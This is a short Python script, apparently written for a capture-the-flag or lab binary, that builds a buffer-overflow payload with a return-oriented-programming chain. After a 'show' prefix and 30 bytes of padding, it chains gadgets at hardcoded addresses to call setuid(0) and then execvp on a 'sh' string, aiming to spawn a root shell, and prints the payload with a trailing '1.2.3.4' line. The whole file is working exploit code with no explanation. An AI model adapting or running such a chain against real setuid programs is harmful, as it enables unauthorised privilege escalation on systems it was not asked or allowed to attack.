import struct
import os

def p64(addr):
    return struct.pack('<q', addr)

buf = "A"*30

pop_rdi = p64(0x400de3)
pop_rsi = p64(0x400de1)

execvp_plt = p64(0x400760)
setuid_plt = p64(0x400780)
sh_str = p64(0x40046e)
null = p64(0x0)

payload = "show"
payload += buf
## ROP CHAIN BEGIN
# SetUID(0)
payload += pop_rdi
payload += null
payload += setuid_plt
# Execvp(sh,0)
payload += pop_rdi
payload += sh_str
payload += pop_rsi
payload += null
payload += null
## ROP CHAIN END
payload += execvp_plt

payload += "\n1.2.3.4"

print(payload)
